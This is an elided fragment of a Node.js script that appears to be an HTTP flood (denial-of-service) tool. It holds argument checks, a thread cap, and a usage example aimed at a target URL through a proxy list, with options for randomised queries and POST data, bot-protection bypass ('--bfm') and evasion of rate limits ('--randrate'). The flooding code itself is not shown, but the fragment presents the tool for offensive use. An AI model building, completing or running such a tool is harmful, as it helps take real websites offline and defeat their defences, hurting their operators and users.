...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    ...
    How to use & example:
      ...
      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 1000 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
    ...
    Options:
      ...
      --randrate - randomizer rate 1 to 1000 good bypass to rate
...
if (isNaN(threads) || threads <= 0 || threads > 1024) {
    console.error('Error threads can not high 1024')
    process.exit(1);
}
